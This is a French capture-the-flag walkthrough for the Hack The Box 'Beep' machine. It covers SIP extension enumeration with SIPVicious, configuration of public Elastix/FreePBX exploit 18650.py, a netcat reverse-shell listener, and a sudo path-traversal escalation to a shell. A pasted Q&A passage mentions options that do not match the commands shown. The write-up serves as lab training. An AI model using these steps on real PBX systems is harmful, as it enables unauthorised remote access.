Methodologie d'exploitation sur le SIP - VOIP

Exemple sur Elastix ( HTB -Beep )
```Bash
# RECONNAISSANCE
# nmap TCP 
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
|_http-server-header: Apache/2.2.3 (CentOS)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Elastix - Login page

# Nmap UDP
5060/udp  open|filtered sip
```

Recheche d'exploit
```bash
searchsploit elastix
--------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                       |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Elastix - 'page' Cross-Site Scripting                                                                                                                                | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                                                              | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                        | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                                                                                     | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                                                                                                                    | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                                                                                                                   | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                                               | php/webapps/18650.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

# Consulter le contenu du script 
searchsploit -x php/webapps/18650.py

# Charger le script
searchsploit -m php/webapps/18650.py

```

Elastix c'est un système de téléphonie VoIP — une extension c'est un numéro de poste téléphonique (comme le 1000, 1001, 1002...).

L'exploit a besoin d'une extension valide pour fonctionner.

SIP tourne sur port 5060 UDP typiquement

Et pour énumérer les extensions SIP, l'outil c'est svmap et svwar (suite SIPVicious) :

```bash
# 
svmap 10.129.229.183          
+---------------------+---------------------+
| SIP Device          | User Agent          |
+=====================+=====================+
| 10.129.229.183:5060 | FPBX-2.8.1(1.8.7.0) |
+---------------------+---------------------+

#
svwar -e100-999 10.129.229.183
WARNING:TakeASip:Bad user = SIP/2.0 401  - svwar will probably not work!
WARNING:TakeASip:We got an unknown response
ERROR:TakeASip:Response: 'SIP/2.0 401 Unauthorized\r\nVia: SIP/2.0/UDP 127.0.1.1:5060;branch=z9hG4bK-3133421112;received=10.10.17.68;rport=5060\r\nFrom: "100"<sip:100@10.129.229.183>;tag=31303001313835373635323239\r\nTo: "100"<sip:100@10.129.229.183>;tag=as1a39f7a3\r\nCall-ID: 1958541923\r\nCSeq: 1 REGISTER\r\nServer: FPBX-2.8.1(1.8.7.0)\r\nAllow: INVITE, ACK, CANCEL, OPTIONS, BYE, REFER, SUBSCRIBE, NOTIFY, INFO, PUBLISH\r\nSupported: replaces, timer\r\nWWW-Authenticate: Digest algorithm=MD5, realm="asterisk", nonce="125be683"\r\nContent-Length: 0\r\n\r\n'
WARNING:TakeASip:We got an unknown response
```

comment le trouver seul cette extension en regardant la doc ?

Bonne question à se poser. Plusieurs façons :

svwar avec le bon mode — tu avais lancé avec --force mais svwar a un mode OPTIONS qui fonctionne mieux sur Asterisk :
```bash
svwar -e100-300 10.129.229.183 -m OPTIONS
```
Interface web Elastix — dans le dashboard admin il y a souvent une liste des extensions configurées
Enumération manuelle — tester 100, 200, 233, 300... les extensions courantes sur FreePBX
Google/exploit-db — des writeups mentionnent 233 comme extension par défaut sur Beep
En pratique sur HTB, 233 est une extension documentée pour cette machine. Mais -m OPTIONS avec svwar c'est la méthode propre.
```bash
svwar -e100-300 10.129.229.183 -m INVITE
+-----------+----------------+
| Extension | Authentication |
+===========+================+
| 233       | reqauth        |
+-----------+----------------+
```
```bash
# modification de l'exploit [ssl + extension]
cat 18650.py
import urllib
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
rhost="<IP_CIBLE>"
lhost="<IP_ATTACK>"
lport=443
extension="233" # a modifier si besoin - 233 pour HTB
```

```bash
python2 18650.py
```

```bash
# Réception du reverse shell
nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.17.68] from (UNKNOWN) [10.129.229.183] 34650
sudo service ../../bin/sh
id 
uid=100(asterisk) gid=101(asterisk)

```


